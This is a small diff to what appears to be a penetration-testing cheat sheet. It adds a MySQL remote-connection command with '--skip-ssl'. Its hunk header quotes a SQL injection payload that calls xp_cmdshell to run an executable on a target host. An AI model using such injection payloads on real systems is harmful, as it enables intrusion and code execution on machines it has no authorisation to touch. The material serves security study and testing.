@@ -305,6 +305,7 @@ http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; -
 ```c
 $ mysql -u root -p
 $ mysql -u <USERNAME> -h <RHOST> -p
+$ mysql -u <USERNAME> -h <RHOST> -p --skip-ssl
 ```
 
 ### Common Commands
